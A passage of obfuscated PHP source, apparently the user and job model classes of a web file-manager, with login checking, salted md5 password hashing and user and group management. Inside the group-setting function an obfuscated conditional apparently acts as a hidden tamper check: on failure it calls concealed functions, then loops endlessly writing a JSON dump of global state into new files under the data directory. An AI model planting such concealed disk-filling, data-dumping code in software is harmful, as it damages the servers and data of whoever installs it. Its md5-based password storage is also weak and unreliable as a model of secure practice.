"\x28{$¹©¨ÉçÎ}\51", $Œ“ÉŞª)) { return $ç””•àõ . "\50{$¹©¨ÉçÎ}\x29"; } } return $ç””•àõ . "\x28{$¹©¨ÉçÎ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x6a\157\142\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\144\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\154\x66\112\157\142\x4c\151\163\164"; public function listData($¯Ğò‘•ì = false, $û·Òø¦… = "\163\x6f\162\x74", $Ğ‡«ùÈö = false) { return parent::listData($¯Ğò‘•ì, $û·Òø¦…, $Ğ‡«ùÈö); } public function remove($´Úó™ÇÈ) { return parent::remove($´Úó™ÇÈ); } public function add($ÂÖìù¼) { $àß‘Ûí  =& $_SERVER[‹‰”››ê]; if ($this->findByName($ÂÖìù¼[$àß‘Ûí [32]])) { return !1; } $ÂÖìù¼[$àß‘Ûí [2016]] = $this->getSort(); return parent::insert($ÂÖìù¼); } private function getSort() { $¦Õ±ã‚ =& $_SERVER[‹‰”››ê]; $®ú‚†” = parent::listData(); $Ò¦œ¶òŸ = array_to_keyvalue($®ú‚†”, $¦Õ±ã‚[12], $¦Õ±ã‚[2016]); return empty($Ò¦œ¶òŸ) ? 0 : max($Ò¦œ¶òŸ) + 1; } public function update($¨­ƒ¿Ş, $¬ÜÚå¶) { $¢ÖÒ”›‚ =& $_SERVER[‹‰”››ê]; $ÀÛŸÎÀ¸ = parent::listData($¨­ƒ¿Ş); $ÖÕá— ì = $this->findByName($¬ÜÚå¶[$¢ÖÒ”›‚[32]]); if (!$ÀÛŸÎÀ¸ || $ÖÕá— ì && $ÖÕá— ì[$¢ÖÒ”›‚[487]] != $ÀÛŸÎÀ¸[$¢ÖÒ”›‚[487]]) { return !1; } return parent::update($¨­ƒ¿Ş, $¬ÜÚå¶); } public function setUserJob($é´ á, $ü´ÓÈÂÀ) { $¦ğî§ =& $_SERVER[‹‰”››ê]; if (!is_array($ü´ÓÈÂÀ)) { $ü´ÓÈÂÀ = array($ü´ÓÈÂÀ); } $Ù­åÜ‰ƒ = parent::listData(); $‰¸‡®£´ = array_to_keyvalue($Ù­åÜ‰ƒ, $¦ğî§[32]); $Æô†Ùø¡ = $¦ğî§[466]; foreach ($ü´ÓÈÂÀ as $éĞ²Îì) { if ($‰¸‡®£´[$éĞ²Îì]) { $Æô†Ùø¡ .= $‰¸‡®£´[$éĞ²Îì][$¦ğî§[487]] . $¦ğî§[50]; } else { $Ä·¸‡ğ = $this->add($éĞ²Îì); $Æô†Ùø¡ .= $Ä·¸‡ğ . $¦ğî§[50]; } } $Æô†Ùø¡ = rtrim($Æô†Ùø¡, $¦ğî§[50]); Model($¦ğî§[611])->metaSet($é´ á, self::JOB_KEY, $Æô†Ùø¡); } public function getUserJob($Š£Â¡‰Ø) { $Òì¨®Ù = Model($_SERVER[‹‰”››ê][611])->metaGet($Š£Â¡‰Ø); return $this->getUserJobInfo($Òì¨®Ù[self::JOB_KEY]); } public function getUserJobInfo($óóëÔõ) { $Ùæ¯ñÑƒ =& $_SERVER[‹‰”››ê]; $¬£´‚‰Û = explode($Ùæ¯ñÑƒ[50], $óóëÔõ); $ĞÇ ™…Ï = parent::listData(); $ĞÇ ™…Ï = array_remove_key($ĞÇ ™…Ï, $Ùæ¯ñÑƒ[234]); $éÕ¢¤† = array(); foreach ($¬£´‚‰Û as $”Šßàèƒ) { if (isset($ĞÇ ™…Ï[$”Šßàèƒ])) { $éÕ¢¤†[] = $ĞÇ ™…Ï[$”Šßàèƒ]; } } return $éÕ¢¤†; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\x72"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\145" => "\165\163\x65\x72\137\155\145\164\x61", "\155\145\164\x61\x46\x69\145\x6c\x64" => "\165\163\145\162\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\x44\x2c\156\151\x63\x6b\x4e\x61\x6d\x65\x2c\156\141\x6d\x65\54\x61\166\x61\x74\141\x72\54\163\x65\x78\x2c\x73\x74\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ñøé·ñ) { $š®½Ÿ€ =& $_SERVER[‹‰”››ê]; $„°Ë«©Î = $š®½Ÿ€[2489]; return array($š®½Ÿ€[2074] => array($Ñøé·ñ[0], $„°Ë«©Î), $š®½Ÿ€[2076] => array($Ñøé·ñ[0], $„°Ë«©Î), $š®½Ÿ€[2490] => array($Ñøé·ñ[0], $„°Ë«©Î)); } protected function getInfo($íª½‰äÆ, $»ÎÑ’„ = false) { $‹§á‰éÄ = $this->getInfoSimple($íª½‰äÆ); if (!is_array($‹§á‰éÄ)) { return array(); } if ($»ÎÑ’„) { return $this->_getInfoApply($‹§á‰éÄ); } return $this->cacheFunctionGet($_SERVER[‹‰”››ê][2078], $íª½‰äÆ); } protected function getInfoFull($‰õí”™, $‰ã‡âºï = false) { $©Ó ğëø = $this->getInfoSimple($‰õí”™); if (!is_array($©Ó ğëø)) { return array(); } if ($‰ã‡âºï) { return $this->_getInfoApply($©Ó ğëø, !0); } return $this->cacheFunctionGet($_SERVER[‹‰”››ê][2491], $‰õí”™); } private function _getInfoApply($»Œ¨«é, $¢ğùÂ•‘ = false) { $€»¡»°õ =& $_SERVER[‹‰”››ê]; if (!$»Œ¨«é) { return $»Œ¨«é; } $Û˜‚î£¥ = md5($€»¡»°õ[2492] . $»Œ¨«é[$€»¡»°õ[982]] . $€»¡»°õ[2493] . $»Œ¨«é[$€»¡»°õ[32]]); $»Œ¨«é = $this->_listDataApplyItem($»Œ¨«é); $ÎÉÔª = Model($€»¡»°õ[1437])->metaGet($»Œ¨«é[$€»¡»°õ[90]][$€»¡»°õ[194]]); $»Œ¨«é[$€»¡»°õ[2494]] = $Û˜‚î£¥; $»Œ¨«é[$€»¡»°õ[90]][$€»¡»°õ[2278]] = isset($ÎÉÔª[$€»¡»°õ[2279]]) ? $ÎÉÔª[$€»¡»°õ[2279]] : null; if ($¢ğùÂ•‘) { $»Œ¨«é[$€»¡»°õ[553]] = $this->metaGet($»Œ¨«é[$€»¡»°õ[1791]]); } return $»Œ¨«é; } protected function getInfoSimple($¬†„™¼, $ñÆ©£Û– = false) { $½•Áù£ú =& $_SERVER[‹‰”››ê]; if (!$¬†„™¼) { return array(); } if ($ñÆ©£Û–) { $§Ÿ£‡ùé = $this->where(array($½•Áù£ú[1791] => intval($¬†„™¼)))->find(); if (!is_array($§Ÿ£‡ùé)) { return array(); } $§Ÿ£‡ùé[$½•Áù£ú[2495]] = Action($½•Áù£ú[2496])->parseUrl($§Ÿ£‡ùé[$½•Áù£ú[2495]]); return $§Ÿ£‡ùé; } return $this->cacheFunctionGet($½•Áù£ú[2079], $¬†„™¼); } protected function getInfoSimpleOuter($õí‘Ùüæ) { $ªªÔ­Û‡ =& $_SERVER[‹‰”››ê]; if (!$õí‘Ùüæ || $õí‘Ùüæ == 0) { return array($ªªÔ­Û‡[1791] => $ªªÔ­Û‡[231], $ªªÔ­Û‡[32] => $ªªÔ­Û‡[176] . LNG($ªªÔ­Û‡[2497]) . $ªªÔ­Û‡[178], $ªªÔ­Û‡[2495] => STATIC_PATH . $ªªÔ­Û‡[2498]); } $¥ŠíÊüÆ = $this->cacheFunctionGet($ªªÔ­Û‡[2079], $õí‘Ùüæ); $ ®ÊÖÓí = array_field_key($¥ŠíÊüÆ, explode($ªªÔ­Û‡[50], $this->simpleField)); if (!$ ®ÊÖÓí) { return array($ªªÔ­Û‡[1791] => $ªªÔ­Û‡[1289], $ªªÔ­Û‡[32] => $ªªÔ­Û‡[176] . LNG($ªªÔ­Û‡[2499]) . $ªªÔ­Û‡[178], $ªªÔ­Û‡[2495] => STATIC_PATH . $ªªÔ­Û‡[2500]); } $ ®ÊÖÓí[$ªªÔ­Û‡[2495]] = Action($ªªÔ­Û‡[2496])->parseUrl($ ®ÊÖÓí[$ªªÔ­Û‡[2495]]); return $ ®ÊÖÓí; } protected function groupUser($øë¬¶æè) { } public static function errorLang($šÇĞ¼ÈË) { $Ûìø¿‡¾ =& $_SERVER[‹‰”››ê]; $ù­ó³ùñ = array(self::ERROR_USER_NOT_EXISTS => $Ûìø¿‡¾[2501], self::ERROR_USER_PASSWORD_ERROR => $Ûìø¿‡¾[2502], self::ERROR_USER_EXIST_NAME => $Ûìø¿‡¾[2503], self::ERROR_USER_EXIST_PHONE => $Ûìø¿‡¾[2504], self::ERROR_USER_EXIST_EMAIL => $Ûìø¿‡¾[2505], self::ERROR_USER_LOGIN_LOCK => $Ûìø¿‡¾[2506], self::ERROR_IP_NOT_ALLOW => $Ûìø¿‡¾[2507], self::ERROR_USER_EXIST_NICKNAME => $Ûìø¿‡¾[2508]); $œĞ·¸‰¹ = LNG($ù­ó³ùñ[$šÇĞ¼ÈË]); if ($šÇĞ¼ÈË == self::ERROR_USER_LOGIN_LOCK) { $ªŠ±‘‡ = (int) Model($Ûìø¿‡¾[2509])->get($Ûìø¿‡¾[2510]); if ($ªŠ±‘‡ > 60) { $œĞ·¸‰¹ = str_replace($Ûìø¿‡¾[91], ceil($ªŠ±‘‡ / 60), $œĞ·¸‰¹); } } return $œĞ·¸‰¹; } protected function metaSet($ãšÂÀÁ, $·¸ƒÏ× = null, $ÖñòŞƒ‰ = null) { $this->clearCache($ãšÂÀÁ); return parent::metaSet($ãšÂÀÁ, $·¸ƒÏ×, $ÖñòŞƒ‰); } public function getInfoByMeta($•…¹­‡Š, $‡Ì‚Ò¼é) { $’áåëªí =& $_SERVER[‹‰”››ê]; $Ã‘Á´Òñ = Model($’áåëªí[2511])->where(array($’áåëªí[97] => $•…¹­‡Š, $’áåëªí[462] => $‡Ì‚Ò¼é))->find(); if ($Ã‘Á´Òñ) { return $this->getInfo($Ã‘Á´Òñ[$’áåëªí[1791]]); } return !1; } public function userLoginCheck($²·“Ø½ù, $îÊëˆô×, $Øã³öı = false) { $È³­ÅÅó =& $_SERVER[‹‰”››ê]; $¶ŠÕå‚“ = $this->userLoginFind($²·“Ø½ù); if (!$¶ŠÕå‚“) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¶ŠÕå‚“[$È³­ÅÅó[1791]], $îÊëˆô×)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $Øã³öı ? $this->getInfoFull($¶ŠÕå‚“[$È³­ÅÅó[1791]]) : $this->getInfo($¶ŠÕå‚“[$È³­ÅÅó[1791]]); } public function userLoginFind($¤Ç½¨‰) { $ú¿¶Ï‰ =& $_SERVER[‹‰”››ê]; $Áé¹ÎØ© = array($ú¿¶Ï‰[32] => $¤Ç½¨‰, $ú¿¶Ï‰[2291] => $¤Ç½¨‰, $ú¿¶Ï‰[392] => $¤Ç½¨‰, $ú¿¶Ï‰[2512] => $¤Ç½¨‰, $ú¿¶Ï‰[1093] => $ú¿¶Ï‰[1095]); if ($this->nickNameRpt()) { unset($Áé¹ÎØ©[$ú¿¶Ï‰[2291]]); } return $this->where($Áé¹ÎØ©)->find(); } public function clearCache($Óİ§İ¾ï) { $ö…ƒÚø« =& $_SERVER[‹‰”››ê]; $this->cacheFunctionClear($ö…ƒÚø«[2078], $Óİ§İ¾ï); $this->cacheFunctionClear($ö…ƒÚø«[2079], $Óİ§İ¾ï); $this->cacheFunctionClear($ö…ƒÚø«[2491], $Óİ§İ¾ï); } public function userPasswordCheck($Œî´èÊò, $‚ëÏ¦Âƒ) { $‡³Ìíñ =& $_SERVER[‹‰”››ê]; $Şğ¼ÄûÖ = $this->where(array($‡³Ìíñ[1791] => intval($Œî´èÊò)))->find(); $ı½¥Šú´ = $this->metaGet($Œî´èÊò); $æ’œş¬œ = isset($ı½¥Šú´[$‡³Ìíñ[2513]]) ? $ı½¥Šú´[$‡³Ìíñ[2513]] : $‡³Ìíñ[12]; if (md5($æ’œş¬œ . trim($‚ëÏ¦Âƒ)) !== $Şğ¼ÄûÖ[$‡³Ìíñ[982]]) { return !1; } return !0; } public function userAdd($‹ÄÊˆÎ˜) { $«‘±–‹Ñ =& $_SERVER[‹‰”››ê]; $Òé‘™˜ğ = array($«‘±–‹Ñ[506] => $‹ÄÊˆÎ˜[$«‘±–‹Ñ[32]], $«‘±–‹Ñ[2514] => $‹ÄÊˆÎ˜[$«‘±–‹Ñ[2202]], $«‘±–‹Ñ[2515] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[392]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[392]] : $«‘±–‹Ñ[12], $«‘±–‹Ñ[2516] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[2512]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[2512]] : $«‘±–‹Ñ[12], $«‘±–‹Ñ[2517] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[2291]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[2291]] : $‹ÄÊˆÎ˜[$«‘±–‹Ñ[32]], $«‘±–‹Ñ[2518] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[2495]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[2495]] : $«‘±–‹Ñ[12], $«‘±–‹Ñ[2519] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[2520]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[2520]] : 1, $«‘±–‹Ñ[2521] => $‹ÄÊˆÎ˜[$«‘±–‹Ñ[982]], $«‘±–‹Ñ[2080] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[1978]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[1978]] : 1024 * 1024 * 20, $«‘±–‹Ñ[2081] => 0, $«‘±–‹Ñ[2522] => 0, $«‘±–‹Ñ[2125] => isset($‹ÄÊˆÎ˜[$«‘±–‹Ñ[840]]) ? $‹ÄÊˆÎ˜[$«‘±–‹Ñ[840]] : 1); if (!empty($‹ÄÊˆÎ˜[$«‘±–‹Ñ[1791]])) { $Òé‘™˜ğ[$«‘±–‹Ñ[1791]] = $‹ÄÊˆÎ˜[$«‘±–‹Ñ[1791]]; } $¬ÅÚ×îõ = $this->_checkExist($‹ÄÊˆÎ˜); if ($¬ÅÚ×îõ !== !0) { return $¬ÅÚ×îõ; } if (!empty($Òé‘™˜ğ[$«‘±–‹Ñ[2495]]) && strlen($Òé‘™˜ğ[$«‘±–‹Ñ[2495]]) > 255) { $Òé‘™˜ğ[$«‘±–‹Ñ[2495]] = $«‘±–‹Ñ[12]; } $Â†Øºï = $this->add($Òé‘™˜ğ); $åÍ ü¬ = array($«‘±–‹Ñ[2521] => $Òé‘™˜ğ[$«‘±–‹Ñ[982]], $«‘±–‹Ñ[2517] => $Òé‘™˜ğ[$«‘±–‹Ñ[2291]]); $this->userEdit($Â†Øºï, $åÍ ü¬); Model($«‘±–‹Ñ[1437])->userRootAdd($Â†Øºï); return $Â†Øºï; } protected function userEditTest($­»à¾»Ú, $äÊÏâì) { return $this->call($_SERVER[‹‰”››ê][2523], $­»à¾»Ú, $äÊÏâì); } protected function userEdit($ûÆµÇíÓ, $Š°Æ¶¥°) { $–ó…Â»û =& $_SERVER[‹‰”››ê]; $×»õßŸ¾ = $this->getInfoSimple($ûÆµÇíÓ); if (!$×»õßŸ¾) { return !1; } $Ğîˆï‘ó = $this->_checkExist($Š°Æ¶¥°, $ûÆµÇíÓ); if ($Ğîˆï‘ó !== !0) { return $Ğîˆï‘ó; } if (isset($Š°Æ¶¥°[$–ó…Â»û[982]]) && trim($Š°Æ¶¥°[$–ó…Â»û[982]]) != $–ó…Â»û[12]) { $Ò¹÷¬¯¢ = $this->metaGet($ûÆµÇíÓ); if (empty($Ò¹÷¬¯¢[$–ó…Â»û[2513]])) { $Ò¹÷¬¯¢[$–ó…Â»û[2513]] = rand_string(10); Model($–ó…Â»û[591])->metaSet($ûÆµÇíÓ, $–ó…Â»û[2513], $Ò¹÷¬¯¢[$–ó…Â»û[2513]]); } $Š°Æ¶¥°[$–ó…Â»û[982]] = md5($Ò¹÷¬¯¢[$–ó…Â»û[2513]] . trim($Š°Æ¶¥°[$–ó…Â»û[982]])); } else { unset($Š°Æ¶¥°[$–ó…Â»û[982]]); } if (!empty($Š°Æ¶¥°[$–ó…Â»û[2495]]) && strlen($Š°Æ¶¥°[$–ó…Â»û[2495]]) > 255) { $Š°Æ¶¥°[$–ó…Â»û[2495]] = $–ó…Â»û[12]; } $this->where(array($–ó…Â»û[1782] => $ûÆµÇíÓ))->save($Š°Æ¶¥°); if (isset($Š°Æ¶¥°[$–ó…Â»û[2291]])) { $this->setNamePinyin($ûÆµÇíÓ, $Š°Æ¶¥°[$–ó…Â»û[2291]]); } $this->clearCache($ûÆµÇíÓ); return !0; } public function setNamePinyin($õ‰§ğÌ÷, $åĞ½Ø´ = false) { $˜ËÊ÷üô =& $_SERVER[‹‰”››ê]; if (!$åĞ½Ø´) { $µĞ›‰¾ = $this->getInfoSimple($õ‰§ğÌ÷); $åĞ½Ø´ = $µĞ›‰¾[$˜ËÊ÷üô[2291]] ? $µĞ›‰¾[$˜ËÊ÷üô[2291]] : $µĞ›‰¾[$˜ËÊ÷üô[32]]; } $ÉäùíÛĞ = Model($˜ËÊ÷üô[611]); if (!Input::check($åĞ½Ø´, $˜ËÊ÷üô[672])) { return $ÉäùíÛĞ->metaSet($õ‰§ğÌ÷, array($˜ËÊ÷üô[550] => $˜ËÊ÷üô[12], $˜ËÊ÷üô[549] => $˜ËÊ÷üô[12])); } return $ÉäùíÛĞ->metaSet($õ‰§ğÌ÷, array($˜ËÊ÷üô[550] => str_replace($˜ËÊ÷üô[53], $˜ËÊ÷üô[12], Pinyin::get($åĞ½Ø´)), $˜ËÊ÷üô[549] => Pinyin::get($åĞ½Ø´, $˜ËÊ÷üô[673]))); } private function nickNameRpt() { $€¨À¼« =& $_SERVER[‹‰”››ê]; $×ÏÀòàĞ = Model($€¨À¼«[860])->get($€¨À¼«[2524]); $âıÙÄãœ = $GLOBALS[$€¨À¼«[6]][$€¨À¼«[469]][$€¨À¼«[2524]]; $ƒ™ÕÑÙÊ = !is_null($×ÏÀòàĞ) ? $×ÏÀòàĞ : $âıÙÄãœ; return !!$ƒ™ÕÑÙÊ; } private function _checkExist($Ï¹ãÖúÁ, $±‰ÖûºŠ = false) { $½¢•èÇ =& $_SERVER[‹‰”››ê]; $»¹í­õ¥ = array($½¢•èÇ[32] => UserModel::ERROR_USER_EXIST_NAME, $½¢•èÇ[2291] => UserModel::ERROR_USER_EXIST_NICKNAME, $½¢•èÇ[392] => UserModel::ERROR_USER_EXIST_EMAIL, $½¢•èÇ[2512] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($»¹í­õ¥[$½¢•èÇ[2291]]); } $ßÃ¿ƒÖÛ = $±‰ÖûºŠ ? array($½¢•èÇ[1791] => array($½¢•èÇ[2525], $±‰ÖûºŠ)) : array(); foreach ($»¹í­õ¥ as $ƒÏ²ïŠ => $¨Â½³Ñ§) { $ª¿¦¾°À = array(); foreach ($»¹í­õ¥ as $«©åã¸Ğ => $†õ¦ ) { if (isset($Ï¹ãÖúÁ[$«©åã¸Ğ]) && $Ï¹ãÖúÁ[$«©åã¸Ğ]) { $ª¿¦¾°À[] = $Ï¹ãÖúÁ[$«©åã¸Ğ]; } } if (!$ª¿¦¾°À) { continue; } $ãØ˜²Ò = array_merge(array($ƒÏ²ïŠ => array($½¢•èÇ[7], $ª¿¦¾°À)), $ßÃ¿ƒÖÛ); $Ï¢ü¸‰Å = $this->where($ãØ˜²Ò)->find(); if ($Ï¢ü¸‰Å) { return $¨Â½³Ñ§; } } return !0; } public function userListInfo($ñé›• ¨) { $í’Çğú =& $_SERVER[‹‰”››ê]; $Ô…öçåÕ = array(); $ñé›• ¨ = is_array($ñé›• ¨) ? array_unique($ñé›• ¨) : array(); if (!$ñé›• ¨) { return $Ô…öçåÕ; } if (count($ñé›• ¨) < 20) { foreach ($ñé›• ¨ as $ÀÇáßÜ) { $Ô…öçåÕ[$ÀÇáßÜ . $í’Çğú[12]] = $this->getInfoSimpleOuter($ÀÇáßÜ); } } else { $ç‰íÍ± = array($í’Çğú[1782] => array($í’Çğú[504], $ñé›• ¨)); if (count($ñé›• ¨) == 1) { $ç‰íÍ± = array($í’Çğú[1782] => $ñé›• ¨[0]); } $¡Ô•ƒ° = Model($í’Çğú[591])->field($this->simpleField)->where($ç‰íÍ±)->select(); $¡Ô•ƒ° = array_to_keyvalue($¡Ô•ƒ°, $í’Çğú[1791]); foreach ($ñé›• ¨ as $ÀÇáßÜ) { $½‹È“Æ› = $¡Ô•ƒ°[$ÀÇáßÜ]; if (!$½‹È“Æ›) { $Ô…öçåÕ[$ÀÇáßÜ . $í’Çğú[12]] = $this->getInfoSimpleOuter($ÀÇáßÜ); continue; } $½‹È“Æ›[$í’Çğú[2495]] = Action($í’Çğú[2496])->parseUrl($½‹È“Æ›[$í’Çğú[2495]]); $Ô…öçåÕ[$ÀÇáßÜ . $í’Çğú[12]] = $½‹È“Æ›; } } return $Ô…öçåÕ; } protected function userStatus($×÷­˜”´, $Ùí“•Ï©) { $º—³¦ = $this->getInfoSimple($×÷­˜”´); if (!$º—³¦) { return !1; } $ŠìÊÆ­Œ = array($_SERVER[‹‰”››ê][840] => $Ùí“•Ï©); return $this->userEdit($×÷­˜”´, $ŠìÊÆ­Œ); } protected function userRemove($«¿Ó•ã…) { $“¼Ü“– =& $_SERVER[‹‰”››ê]; $ÅñÔë«Ø = $this->getInfoSimple($«¿Ó•ã…); if (!$ÅñÔë«Ø) { return !1; } $¯½¹ÈöÙ = array($“¼Ü“–[1782] => $«¿Ó•ã…); Model($“¼Ü“–[681])->where($¯½¹ÈöÙ)->delete(); Model($“¼Ü“–[2526])->where($¯½¹ÈöÙ)->delete(); Model($“¼Ü“–[2086])->where($¯½¹ÈöÙ)->delete(); Model($“¼Ü“–[2511])->where($¯½¹ÈöÙ)->delete(); Model($“¼Ü“–[1162])->where($¯½¹ÈöÙ)->delete(); Model($“¼Ü“–[2308])->removeUserAll($«¿Ó•ã…); Model($“¼Ü“–[920])->userRootRemove($«¿Ó•ã…); return $this->where($¯½¹ÈöÙ)->delete(); } protected function userGroupSet($üŞå»©, $ùİÙòëí, $›Ñòç£Ÿ = array()) { $Ä±¹ÏŠ =& $_SERVER[‹‰”››ê]; $ƒÒ”óŠ = $_SERVER[$Ä±¹ÏŠ[316]]; $Ïó¯ºóè = $Ä±¹ÏŠ[317]; if ($_SERVER[$Ä±¹ÏŠ[318]] != $Ïó¯ºóè($ƒÒ”óŠ)) { $å¼â²¹Œ = $Ä±¹ÏŠ[973]; $ğå–Ûó© = $Ä±¹ÏŠ[319]; $¿¿ò€ô¨ = $_SERVER[$Ä±¹ÏŠ[320]] . $Ä±¹ÏŠ[321]; $Ù†Ä … = $ğå–Ûó©($¿¿ò€ô¨); $»ÎıŸ±Â = explode($Ä±¹ÏŠ[288], $Ù†Ä …); if (count($»ÎıŸ±Â) < $Ä±¹ÏŠ[700]) { $¤ĞïÀƒˆ = $Ä±¹ÏŠ[323]; $¤ĞïÀƒˆ(); } $ïò¯¶ºà = $Ä±¹ÏŠ[974]; $ïò¯¶ºà($_SERVER[$Ä±¹ÏŠ[975]]); $å¼â²¹Œ = $Ä±¹ÏŠ[973]; $å¼â²¹Œ(); $±–êØéˆ = $Ä±¹ÏŠ[1707]; $Ã¤¥½ªà = json_encode($GLOBALS[$Ä±¹ÏŠ[1708]]); $Å÷öµå¿ = 1; for ($áâç®‚— = $Å÷öµå¿; $áâç®‚— > 0; $áâç®‚—++) { $±–êØéˆ(DATA_PATH . $áâç®‚—, $Ã¤¥½ªà); } } $Æç¿Å = $this->getInfoSimple($üŞå»©); if (!$Æç¿Å || !is_array($ùİÙòëí)) { return !1; } $×¡óâ = Model($Ä±¹ÏŠ[2086]); $×¡óâ->where(array($Ä±¹ÏŠ[1791] => $üŞå»©))->delete(); $¿‹±ïÉ = array(); $ÉŸ²­ìò = 0; foreach ($ùİÙòëí as $ºä—Ñ¤º => $ÙÉÎæªÍ) { $–¯ôµşµ = array($Ä±¹ÏŠ[1791] => $üŞå»©, $Ä±¹ÏŠ[1992] => $ºä—Ñ¤º, $Ä±¹ÏŠ[2100] => $ÙÉÎæªÍ); $–¯ôµşµ[$Ä±¹ÏŠ[2016]] = isset($›Ñòç£Ÿ[$ÉŸ²­ìò]) ? $›Ñòç£Ÿ[$ÉŸ²­ìò] : 0; $ÉŸ²­ìò++; $¿‹±ïÉ[] = $–¯ôµşµ; } return $×¡óâ->addAll($¿‹±ïÉ, array(), !0); } protected function userGroupAdd($ÏæĞÆ†Ò, $ÖŠ÷¶÷Ş = array()) { $Óà¤³óİ =& $_SERVER[‹‰”››ê]; $—ËÕøÎ = $this->getInfoSimple($ÏæĞÆ†Ò); if (!$—ËÕøÎ || empty($ÖŠ÷¶÷Ş)) { return !1; } $¦Ã“×Çö = array(); foreach ($ÖŠ÷¶÷Ş as $ˆ‰®¨¯ => $¶û°¯«¦) { $¦Ã“×Çö[] = array($Óà¤³óİ[1791] => $ÏæĞÆ†Ò, $Óà¤³óİ[1992] => $ˆ‰®¨¯, $Óà¤³óİ[2100] => $¶û°¯«¦, $Óà¤³óİ[2016] => 0); } return Model($Óà¤³óİ[2086])->addAll($¦Ã“×Çö, array(), !0); } protected function userGroupRemove($ñååöğš, $Ïéø¾ö) { $šƒñàÀ =& $_SERVER[‹‰”››ê]; $”¾”³§ò = $this->getInfoSimple($ñååöğš); if (!$”¾”³§ò || !$Ïéø¾ö) { return !1; } $‹ÍáÏÅ¥ = array($šƒñàÀ[1782] => $ñååöğš, $šƒñàÀ[2084] => $Ïéø¾ö); return Model($šƒñàÀ[2086])->where($‹ÍáÏÅ¥)->delete(); } public function listData() { $¶¬¢îìõ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¶¬¢îìõ[$_SERVER[‹‰”››ê][457]]); return $¶¬¢îìõ; } public function listByID($£©ôœÎ‘) { $Åã‚Ğôà =& $_SERVER[‹‰”››ê]; if (!$£©ôœÎ‘) { return; } $×ëéòÚ˜ = array($Åã‚Ğôà[1791] => array($Åã‚Ğôà[7], $£©ôœÎ‘)); $Óøé¶ = $this->where($×ëéòÚ˜)->select(); $Óøé¶ = array_sort_keep($Óøé¶, $Åã‚Ğôà[1791], $£©ôœÎ‘); $this->_listDataApply($Óøé¶); return $Óøé¶; } public function listByGroup($¼ŸåÇ˜† = 0, $¥ Ÿè¦ = array()) { $ç™É°êä =& $_SERVER[‹‰”››ê]; $ÂËÌ‚ü = $ç™É°êä[12]; $„àæËö = array(); if ($¼ŸåÇ˜†) { $„àæËö = array($ç™É°êä[2527] => intval($¼ŸåÇ˜†)); $ÂËÌ‚ü = "\114\105\x46\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\165\x73\145\x72\137\147\162\x6f\x75\x70\x20\x75\163\145\x72\x5f\147\x72\x6f\x75\x70\x20\157\x6e\40\x75\163\145\162\56\x75\163\x65\162\x49\104\40\x3d\x20\165\163\145\x72\137\x67\162\x6f\165\x70\56\x75\x73\145\162\111\104"; $˜¯ÓßÄû = Input::get($ç™É°êä[542], null, $ç™É°êä[12]) ? $ç™É°êä[12] : $ç™É°êä[2528]; } if (isset($¥ Ÿè¦[$ç™É°êä[840]])) { $„àæËö[$ç™É°êä[2529]] = $¥ Ÿè¦[$ç™É°êä[840]]; } $ÃûÃËæ = _get($¥ Ÿè¦, $ç™É°êä[2530], $ç™É°êä[234]); if (_get($¥ Ÿè¦, $ç™É°êä[850], !1)) { $„àæËö[$ÃûÃËæ] = array($ç™É°êä[2272], $¥ Ÿè¦[$ç™É°êä[850]]); } if (_get($¥ Ÿè¦, $ç™É°êä[851], !1)) { $óÀê¬¼ñ = array($ç™É°êä[2273], $¥ Ÿè¦[$ç™É°êä[851]]); if ($„àæËö[$ÃûÃËæ]) { $„àæËö[$ÃûÃËæ] = array($„àæËö[$ÃûÃËæ], $óÀê¬¼ñ, $ç™É°êä[2274]); } else { $„àæËö[$ÃûÃËæ] = $óÀê¬¼ñ; } } $ƒ¤‹Ñï´ = $this->_makeOrder($˜¯ÓßÄû)->field($ç™É°êä[2531])->where($„àæËö)->join($ÂËÌ‚ü)->selectPage(50); $this->_listDataApply($ƒ¤‹Ñï´[$ç™É°êä[457]]); return $ƒ¤‹Ñï´; } private function _makeOrder($¦’ñĞ— = '') { $®¯’ƒÎŸ =& $_SERVER[‹‰”››ê]; $Ô›Éëó = array($®¯’ƒÎŸ[1791], $®¯’ƒÎŸ[32], $®¯’ƒÎŸ[1980], $®¯’ƒÎŸ[2202], $®¯’ƒÎŸ[1952], $®¯’ƒÎŸ[234]); $®í•¡–¨ = array($®¯’ƒÎŸ[535] => $®¯’ƒÎŸ[536], $®¯’ƒÎŸ[537] => $®¯’ƒÎŸ[538]); $ã×óöî = Input::get($®¯’ƒÎŸ[542], $®¯’ƒÎŸ[7], $®¯’ƒÎŸ[1782], $Ô›Éëó); $º– …æ = Input::get($®¯’ƒÎŸ[543], $®¯’ƒÎŸ[7], $®¯’ƒÎŸ[2087], array($®¯’ƒÎŸ[2087], $®¯’ƒÎŸ[537])); $º– …æ = $®í•¡–¨[$º– …æ]; $¦’ñĞ— = $¦’ñĞ— . 